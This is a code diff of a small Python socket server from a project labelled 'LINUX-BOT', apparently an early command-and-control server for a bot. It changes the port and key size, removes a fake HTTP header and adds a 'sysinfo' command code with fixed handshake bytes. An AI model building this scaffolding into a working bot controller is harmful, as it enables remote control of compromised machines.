@@ -5,7 +5,7 @@
 #     LOCATION : Ukraine
 #
 # [ PINFO ]
-#     DATE     : 09.11.2026
+#     DATE     : 10.11.2026
 #     PROJECT  : LINUX-BOT (SESSION)
 #     PLATFORM : LINUX, WIN32
 #=================================#
@@ -19,31 +19,18 @@ import socket as libSock
 
 
 BOT_SERVER_IPV4 : str = "127.0.0.1"
-BOT_SERVER_PORT : int = 8080
+BOT_SERVER_PORT : int = 12701
 
 
 SOCK_ENCODING : str = "ASCII"
-SOCK_TIMEOUT  : int = 60
-SOCK_KEY_SIZE : int = 32
+SOCK_TIMEOUT  : int = 30
+SOCK_KEY_SIZE : int = 16
 
 
-HTTP_SERVER_NAME: str = "linbot"
 
-HTTP_HDR_CMD: bytes = (
-    "HTTP/1.1 %d OK\r\n" # %d - command
-    f"Server: {HTTP_SERVER_NAME}\r\n"
-    "Content-Length: 0\r\n"
-    "Connection: keep-alive\r\n"
-).encode(SOCK_ENCODING)
-SIZE_HTTP_HDR_CMD: int = 128
+LB_CMD_SYSINFO : int = 201
 
 
-CMD_REG_KEY = 200
-
-
-def build_response(cmd_code: int) -> bytes:
-    header = (HTTP_HDR_CMD % cmd_code) + b"\r\n\r\n"
-    return header
 
 
 def start_server():
@@ -59,8 +46,8 @@ def start_server():
         conn, addr = sock.accept()
 
         with conn:
-            print(conn.recv(1000))
-            conn.sendall(build_response(200))
+            conn.sendall(int(0x04082008).to_bytes(4, 'little') +
+                         int(0x20080804).to_bytes(4, 'little'))
 
 
 
